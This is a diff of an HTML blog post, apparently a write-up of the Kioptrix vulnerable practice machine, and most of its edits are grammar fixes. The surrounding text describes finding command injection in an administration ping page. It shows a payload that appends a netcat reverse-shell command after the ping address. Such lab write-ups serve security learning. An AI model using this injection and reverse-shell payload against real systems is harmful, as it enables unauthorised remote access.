@@ -321,7 +321,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 17.47 seconds
 </code></pre>
 
-<p>Let&rsquo;s take a look on the web server running on the port 80:</p>
+<p>Let&rsquo;s take a look at the web server running on the port 80:</p>
 
 
 <img class="pure-img" src="../images/Kioptrix_1_1_image1.png" alt="">
@@ -339,14 +339,14 @@ Nmap done: 1 IP address (1 host up) scanned in 17.47 seconds
 <img class="pure-img" src="../images/Kioptrix_1_1_image3.png" alt="">
 
 
-<p>Apparently, the only function of this &ldquo;Administration page&rdquo; is to ping a address on my network. If the application can ping a machine from this field, it could also execute other commands. Assuming that the input could be an argument for a system() function, for example, if I&rsquo;m lucky I could take advantage of this for execute a payload invoking a reverse shell just using a simple &ldquo;;&rdquo; to separate two commands in a shell:</p>
+<p>Apparently, the only function of this &ldquo;Administration page&rdquo; is to ping an address on my network. If the application can ping a machine from this field, it could also execute other commands. Assuming that the input could be an argument for a system() function, for example, if I&rsquo;m lucky I could take advantage of this to execute a payload invoking a reverse shell just using a simple &ldquo;;&rdquo; to separate two commands in a shell:</p>
 
 <pre><code>ping 192.168.3.1;nc &lt;my_ip&gt; 4444 -e /bin/sh
 </code></pre>
 
-<p>I setup a listening on port 4444 to handle it but did not work.</p>
+<p>I setup a listening on port 4444 to handle the connection of nc, but did not work.</p>
 
-<p>Maybe I need to provide a complete path to netcat binary (nc binary could not be present on the machine or maybe its directory would not be listed in $PATH). Let&rsquo;s use <em>whereis</em> command to discovering your path:</p>
+<p>Maybe I need to provide a complete path to netcat binary (nc binary could not be present on the machine or maybe it&rsquo;s directory would not be listed in $PATH). Let&rsquo;s use <em>whereis</em> command to discovering your path:</p>
 
 
 <img class="pure-img" src="../images/Kioptrix_1_1_image4.png" alt="">
